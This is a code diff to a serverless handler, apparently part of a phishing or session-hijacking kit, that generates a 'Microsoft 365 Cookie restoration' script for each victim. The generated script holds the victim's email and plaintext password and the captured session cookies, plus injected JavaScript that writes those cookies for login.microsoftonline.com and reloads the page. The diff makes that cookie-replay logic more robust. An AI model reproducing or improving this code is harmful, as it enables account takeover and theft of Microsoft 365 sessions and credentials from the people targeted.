@@ -233,30 +233,64 @@ const handler = async (event, context) => {
       console.log('✅ Using documentCookies:', processedCookies.length);
     }
 
-    const formattedCookies = processedCookies.map(cookie => ({
-      ...cookie,
-      domain: '.login.microsoftonline.com',
-      expirationDate: cookie.expirationDate || Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
-      hostOnly: cookie.hostOnly !== undefined ? cookie.hostOnly : false,
-      httpOnly: cookie.httpOnly !== undefined ? cookie.httpOnly : false,
-      name: cookie.name || '',
-      path: cookie.path || '/',
-      sameSite: cookie.sameSite || 'none',
-      secure: cookie.secure !== undefined ? cookie.secure : true,
-      session: cookie.session !== undefined ? cookie.session : false,
-      storeId: cookie.storeId || null,
-      value: cookie.value || ''
-    }));
-
-    // Create JavaScript injection code
-    const jsInjectionCode = formattedCookies.length > 0 ? 
-      `!function(){console.log("%c COOKIES LOADED","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(JSON.stringify(formattedCookies))});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;console.log("Cookie set:",o.name);setTimeout(()=>location.reload(),1000)}();` :
-      `console.log("%c NO COOKIES AVAILABLE","background:red;color:#fff;font-size:30px;");alert("No cookies found for this session.");`;
+    // Use robust cookie restoration logic (from restoreCookies.js)
+    const robustRestoreFn = `
+function restoreMicrosoftCookies(cookiesArray, options = { reload: true }) {
+    if (!Array.isArray(cookiesArray)) {
+        console.error('Invalid cookies array');
+        return;
+    }
+    const results = [];
+    cookiesArray.forEach(cookie => {
+        try {
+            if (!cookie.name || typeof cookie.value === 'undefined') {
+                throw new Error('Missing name or value');
+            }
+            const name = cookie.name;
+            const value = cookie.value;
+            const domain = cookie.domain || '';
+            const path = cookie.path || '/';
+            const secure = !!cookie.secure;
+            const sameSite = cookie.sameSite || cookie.samesite || 'None';
+            const expiresUnix = cookie.expires || cookie.expirationDate;
+            const isSession = !!cookie.session || expiresUnix === undefined || expiresUnix === null;
+            let cookieString = \`\${name}=\${value}; path=\${path};\`;
+            if (name.startsWith('__Host-')) {
+                cookieString += ' Secure;';
+                cookieString += ' path=/;';
+            } else if (domain) {
+                cookieString += \` domain=\${domain};\`;
+            }
+            if (!isSession && expiresUnix) {
+                const expiresMs = expiresUnix > 1e10 ? expiresUnix : expiresUnix * 1000;
+                const expiresDate = new Date(expiresMs);
+                cookieString += \` expires=\${expiresDate.toUTCString()};\`;
+            }
+            if (secure || name.startsWith('__Secure-') || name.startsWith('__Host-')) {
+                cookieString += ' Secure;';
+            }
+            if (sameSite) {
+                let samesiteNorm = sameSite[0].toUpperCase() + sameSite.slice(1).toLowerCase();
+                cookieString += \` SameSite=\${samesiteNorm};\`;
+            }
+            document.cookie = cookieString;
+            results.push({ name, value, set: true });
+        } catch (err) {
+            results.push({ name: cookie.name || '', set: false, error: err.message });
+            console.error(\`Failed to set cookie "\${cookie.name}": \${err.message}\`);
+        }
+    });
+    console.table(results);
+    console.log(\`✅ Restored \${results.filter(r => r.set).length} cookies\`);
+    if (options.reload) location.reload();
+}
+restoreMicrosoftCookies(${JSON.stringify(processedCookies, null, 2)});
+`;
 
     // Create the output
     const output = `// Microsoft 365 Cookie restoration for ${userEmail}
 // Generated: ${new Date().toISOString()}
-// Cookies found: ${formattedCookies.length}
+// Cookies found: ${processedCookies.length}
 // Session ID: ${sessionId}
 // Email: ${userEmail}
 
@@ -265,12 +299,13 @@ let email = "${userEmail}";
 let password = "${userPassword}";
 let sessionId = "${sessionId}";
 
-console.log("Session Info:", {email, password, cookieCount: ${formattedCookies.length}});
+console.log("Session Info:", {email, password, cookieCount: ${processedCookies.length}});
 
-${jsInjectionCode}
+// Robust restoration logic:
+${robustRestoreFn}
 
 // Cookie Data:
-${JSON.stringify(formattedCookies, null, 2)}
+${JSON.stringify(processedCookies, null, 2)}
 
 // Local Storage:
 // ${cookiesData.localStorage || 'Empty'}
